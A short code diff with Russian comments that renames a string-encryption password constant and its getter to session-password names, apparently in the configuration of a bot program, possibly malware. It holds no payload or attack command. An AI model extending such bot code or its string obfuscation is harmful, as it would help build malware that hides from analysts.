@@ -112,7 +112,7 @@ namespace CONFIGDEBUGSTRINGS
 //--------------------------------------------
 //  Пароль шифрования строк
 //--------------------------------------------
-char ENCRYPT_STRINGS_PASSWORD[MAX_STRINGS_PASSW_SIZE + 1] = BOTPARAM_STRINGS_PASSW;
+char SESSION_PASSWORD[MAX_SESSION_PASSW_SIZE + 1] = BOTPARAM_SESSION_PASSW;
 
 
 //----------------------------------------------------------------------------
@@ -724,9 +724,9 @@ string GetMainPassword2(bool NotNULL)
 //----------------------------------------------------------------------------
 
 // Функция возвращает указатель на пароль для шифрования строк
-PCHAR GetStringsPassword()
+PCHAR GetSessionPassword()
 {
-	return ENCRYPT_STRINGS_PASSWORD;
+	return SESSION_PASSWORD;
 }
 //----------------------------------------------------------------------------
 
